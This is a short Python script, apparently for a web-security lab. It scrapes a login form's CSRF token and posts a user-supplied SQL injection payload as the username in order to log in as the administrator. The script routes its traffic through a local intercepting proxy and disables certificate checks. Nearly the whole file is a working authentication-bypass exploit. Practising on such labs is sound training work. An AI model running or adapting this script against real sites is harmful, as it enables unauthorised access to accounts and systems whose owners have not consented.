import requests
import sys # Helps with system-specific parameters and functions
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The script when run will pass through the below proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    req = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(req.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})['value']
    # print(csrf_input," : CSRF Input Value")
    return csrf_input

def exploit_sqli(session, url, payload):
    csrf = get_csrf_token(session, url)
    data={'csrf': csrf,
          'username': payload,
          'password': 'admin'}
    
    request = session.post(url,data,proxies=proxies,verify=False)
    response_text = request.text.lower()
    if "log out" in response_text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get the URL from command line arguments
        sqli_payload = sys.argv[2].strip()  # Get the payload from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
    
    session = requests.Session()
    # print(session.headers)
    if exploit_sqli(session, url, sqli_payload):
        print("[+] The site appears to be vulnerable to SQL Injection, and we are able to exploit it by logging in as the administrator user.")
    else:
        print("[-] The site does not appear to be vulnerable to SQL Injection.")